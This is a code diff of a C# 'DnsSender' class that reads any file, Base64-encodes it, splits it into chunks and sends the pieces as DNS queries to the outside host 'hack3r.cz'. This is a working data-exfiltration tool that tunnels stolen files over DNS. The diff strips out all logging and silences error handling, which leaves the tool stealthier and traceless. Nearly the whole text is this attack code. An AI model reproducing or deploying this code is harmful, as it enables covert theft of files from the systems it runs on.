@@ -5,18 +5,11 @@ using System.Net.Sockets;
 
 public class DnsSender
 {
-    private readonly string logFilePath;
-
-    public DnsSender()
-    {
-        logFilePath = Path.Combine(Path.GetTempPath(), "error.dns");
-    }
 
     public void Soubor(string filePath)
     {
         try
         {
-            Log("Processing file: " + filePath);
             // Read file content and convert to Base64
             byte[] data = File.ReadAllBytes(filePath);
             string base64 = Convert.ToBase64String(data);
@@ -28,18 +21,18 @@ public class DnsSender
             string dnsfile = Path.GetFileName(filePath).Replace(".", "-");
 
             // Send DNS requests
-            SendDns("---START--- " + dnsfile + " ------.hack3r.cz");
+            SendDns("---START---" + dnsfile + "------.hack3r.cz");
             foreach (string part in parts)
             {
                 string dns = part.Replace("=", "--R") + ".hack3r.cz";
                 SendDns(dns);
             }
-            SendDns("----END---- " + dnsfile + "------.hack3r.cz");
-            Log("File processed successfully.");
+            SendDns("----END---- "+ dnsfile + "------.hack3r.cz");
+
         }
         catch (Exception ex)
         {
-            Log("Error in Soubor: " + ex.Message);
+
         }
     }
 
@@ -47,7 +40,6 @@ public class DnsSender
     {
         try
         {
-            Log("Splitting string into chunks of size " + chunkSize);
             int length = str.Length;
             int chunkCount = (length + chunkSize - 1) / chunkSize;
             string[] chunks = new string[chunkCount];
@@ -57,12 +49,10 @@ public class DnsSender
                 int size = Math.Min(chunkSize, length - start);
                 chunks[i] = str.Substring(start, size);
             }
-            Log("String split successfully.");
             return chunks;
         }
         catch (Exception ex)
         {
-            Log("Error in SplitString: " + ex.Message);
             throw;
         }
     }
@@ -71,7 +61,7 @@ public class DnsSender
     {
         try
         {
-            Log("Resolving DNS request: " + dnsRequest);
+
 
             // Use a specific DNS server (dns.com)
             string dnsServer = "hack3r.cz";
@@ -89,12 +79,12 @@ public class DnsSender
                 // Optionally receive response
                 IPEndPoint remoteEndpoint = null;
                 byte[] response = dnsClient.Receive(ref remoteEndpoint);
-                Log("DNS request sent successfully. Response received.");
+
             }
         }
         catch (Exception ex)
         {
-            Log("Error in SendDns: " + ex.Message);
+
         }
     }
 
@@ -102,7 +92,7 @@ public class DnsSender
     {
         try
         {
-            Log("Building DNS query for: " + dnsRequest);
+
 
             // DNS query header
             byte[] header = new byte[12];
@@ -142,25 +132,14 @@ public class DnsSender
             Buffer.BlockCopy(header, 0, query, 0, header.Length);
             Buffer.BlockCopy(question, 0, query, header.Length, question.Length);
 
-            Log("DNS query built successfully.");
+
             return query;
         }
         catch (Exception ex)
         {
-            Log("Error in BuildDnsQuery: " + ex.Message);
+
             throw;
         }
     }
 
-    private void Log(string message)
-    {
-        try
-        {
-            File.AppendAllText(logFilePath, DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + ": " + message + Environment.NewLine);
-        }
-        catch
-        {
-            // Silently handle logging errors
-        }
-    }
 }
